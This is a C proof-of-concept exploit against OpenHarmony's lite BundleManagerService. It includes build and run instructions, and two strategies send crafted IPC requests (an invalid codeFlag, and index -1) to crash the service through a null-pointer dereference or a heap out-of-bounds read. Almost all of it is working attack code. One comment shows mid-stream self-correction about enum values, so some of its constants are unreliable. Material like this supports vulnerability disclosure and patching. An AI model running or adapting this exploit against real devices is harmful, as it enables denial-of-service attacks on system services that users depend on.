/*
 * PoC: BMS HandleGetBundleInfosByIndex OOB Read / Null-Ptr Crash
 *
 * Target: OpenHarmony bundle_framework_lite BundleManagerService
 * File:   services/bundlemgr_lite/src/bundle_ms_feature.cpp
 * Func:   BundleMsFeature::HandleGetBundleInfosByIndex
 *
 * Vulnerability:
 *   The server reads `index` from IPC request via ReadInt32() without any
 *   bounds validation. It then accesses `bundleInfos[index]` which causes:
 *   - If GetInnerBundleInfos() returns nullptr: null pointer dereference
 *   - If index < 0 or index >= array length: heap out-of-bounds read
 *   Both result in BMS service crash (DoS).
 *
 * Attack model:
 *   Any app (no special permissions required beyond basic IPC access to BMS)
 *   can send a crafted GET_BUNDLE_INFO_BY_INDEX request to crash the system
 *   BundleManager service.
 *
 * Build (cross-compile for OpenHarmony LiteOS-A target):
 *   arm-linux-ohos-clang poc_bundle_oob_crash.c -o poc_bms_crash \
 *       -I${OH_SDK}/sysroot/usr/include \
 *       -lsamgr_proxy -lipc_single -lbundle_lite
 *
 * Run on device:
 *   ./poc_bms_crash
 *   Expected result: BMS service crashes, system bundle operations fail
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>

/* OpenHarmony LiteOS samgr/ipc headers */
#include "samgr_lite.h"
#include "iproxy_client.h"
#include "liteipc_adapter.h"

/* BMS service/feature names */
#define BMS_SERVICE   "bundlems"
#define BMS_FEATURE   "BmsFeature"

/* IPC funcId for GET_BUNDLE_INFO_BY_INDEX */
#define GET_BUNDLE_INFO_BY_INDEX  10

/* GET_BUNDLE_INFOS codeFlag (triggers GetBundleInfos path in GetInnerBundleInfos) */
#define GET_BUNDLE_INFOS_FLAG     0

/* IPC buffer size */
#define MAX_IO_SIZE  512

/*
 * Callback for IPC invoke - we don't care about the response since
 * the service will crash before sending one.
 */
static int32_t DummyCallback(void *owner, int code, IpcIo *reply)
{
    (void)owner;
    (void)code;
    (void)reply;
    printf("[PoC] Got reply (unexpected - service should have crashed)\n");
    return 0;
}

/*
 * Strategy 1: Trigger null pointer dereference
 *
 * Send an invalid codeFlag (e.g., 99) to GetInnerBundleInfos so it returns
 * nullptr, then any index value causes nullptr + offset = crash.
 */
static int trigger_nullptr_crash(IClientProxy *bmsClient)
{
    IpcIo ipcIo;
    char data[MAX_IO_SIZE];
    IpcIoInit(&ipcIo, data, MAX_IO_SIZE, 0);

    /*
     * HandleGetBundleInfosByIndex reads from IPC in this order:
     *   1. GetInnerBundleInfos reads:
     *      - int32_t codeFlag  (we send invalid value -> returns nullptr)
     *   2. HandleGetBundleInfosByIndex reads:
     *      - int32_t index     (any value, applied to nullptr)
     */

    /* codeFlag = 99 (invalid, not GET_BUNDLE_INFOS/QUERY_KEEPALIVE/GET_BY_METADATA) */
    WriteInt32(&ipcIo, 99);

    /* index = 0x41414141 (applied to nullptr -> crash at 0x41414141 * sizeof(BundleInfo)) */
    WriteInt32(&ipcIo, 0x41414141);

    printf("[PoC] Sending crafted GET_BUNDLE_INFO_BY_INDEX with invalid codeFlag...\n");
    printf("[PoC] Expected: BMS crashes due to nullptr + 0x41414141 * sizeof(BundleInfo)\n");

    int32_t ret = bmsClient->Invoke(
        bmsClient,
        GET_BUNDLE_INFO_BY_INDEX,
        &ipcIo,
        NULL,
        DummyCallback
    );

    if (ret != 0) {
        printf("[PoC] Invoke returned %d (service likely crashed)\n", ret);
        return 1;  /* success - service crashed */
    }
    return 0;
}

/*
 * Strategy 2: Trigger heap out-of-bounds read
 *
 * Send valid codeFlag (GET_BUNDLE_INFOS with flag=1) so GetInnerBundleInfos
 * returns a valid array, but send an extremely large/negative index to read
 * beyond the allocated array.
 */
static int trigger_oob_read(IClientProxy *bmsClient)
{
    IpcIo ipcIo;
    char data[MAX_IO_SIZE];
    IpcIoInit(&ipcIo, data, MAX_IO_SIZE, 0);

    /*
     * GetInnerBundleInfos reads:
     *   - int32_t codeFlag = GET_BUNDLE_INFOS (value 0 in the function's switch)
     *     Wait - codeFlag mapping in GetInnerBundleInfos:
     *       GET_BUNDLE_INFOS = 4 (enum value from Invoke dispatch)
     *     But inside GetInnerBundleInfos the comparison is against the funcId
     *     passed through. Let me use the actual enum value.
     *
     *     Actually looking at the code again:
     *       if (codeFlag == GET_BUNDLE_INFOS)        -> 4
     *       else if (codeFlag == QUERY_KEEPALIVE...)  -> 5
     *       else if (codeFlag == GET_BUNDLE_INFOS_BY_METADATA) -> 6
     *
     *   - int32_t flag (for GetBundleInfos, 0 or 1)
     *
     * HandleGetBundleInfosByIndex then reads:
     *   - int32_t index (our malicious value)
     */

    /* codeFlag = 4 (GET_BUNDLE_INFOS) - valid path */
    WriteInt32(&ipcIo, 4);

    /* flag = 0 (GET_BUNDLE_DEFAULT) */
    WriteInt32(&ipcIo, 0);

    /* index = -1 (0xFFFFFFFF as int32) -> bundleInfos + (-1) = heap underflow */
    WriteInt32(&ipcIo, -1);

    printf("[PoC] Sending crafted GET_BUNDLE_INFO_BY_INDEX with index=-1...\n");
    printf("[PoC] Expected: BMS crashes due to heap OOB read at bundleInfos[-1]\n");

    int32_t ret = bmsClient->Invoke(
        bmsClient,
        GET_BUNDLE_INFO_BY_INDEX,
        &ipcIo,
        NULL,
        DummyCallback
    );

    if (ret != 0) {
        printf("[PoC] Invoke returned %d (service likely crashed)\n", ret);
        return 1;
    }
    return 0;
}

int main(int argc, char *argv[])
{
    printf("=== PoC: BMS HandleGetBundleInfosByIndex OOB/Nullptr Crash ===\n");
    printf("Target: OpenHarmony bundle_framework_lite BundleManagerService\n");
    printf("Bug:    Unchecked index from IPC leads to OOB read or nullptr deref\n\n");

    /* Connect to BMS service via samgr */
    IUnknown *iUnknown = SAMGR_GetInstance()->GetFeatureApi(BMS_SERVICE, BMS_FEATURE);
    if (iUnknown == NULL) {
        printf("[!] Failed to get BMS feature API. Is bundlems running?\n");
        return 1;
    }

    IClientProxy *bmsClient = NULL;
    int result = iUnknown->QueryInterface(iUnknown, CLIENT_PROXY_VER, (void **)&bmsClient);
    if (result != 0 || bmsClient == NULL) {
        printf("[!] Failed to get BMS client proxy\n");
        return 1;
    }

    printf("[+] Connected to BMS service\n\n");

    /* Try Strategy 1: nullptr crash (most reliable) */
    printf("--- Strategy 1: Null pointer dereference ---\n");
    if (trigger_nullptr_crash(bmsClient)) {
        printf("[+] Service crashed! PoC successful.\n");
        return 0;
    }

    sleep(1);

    /* Try Strategy 2: heap OOB read */
    printf("\n--- Strategy 2: Heap out-of-bounds read ---\n");
    if (trigger_oob_read(bmsClient)) {
        printf("[+] Service crashed! PoC successful.\n");
        return 0;
    }

    printf("\n[-] Service did not crash (unexpected)\n");
    return 1;
}
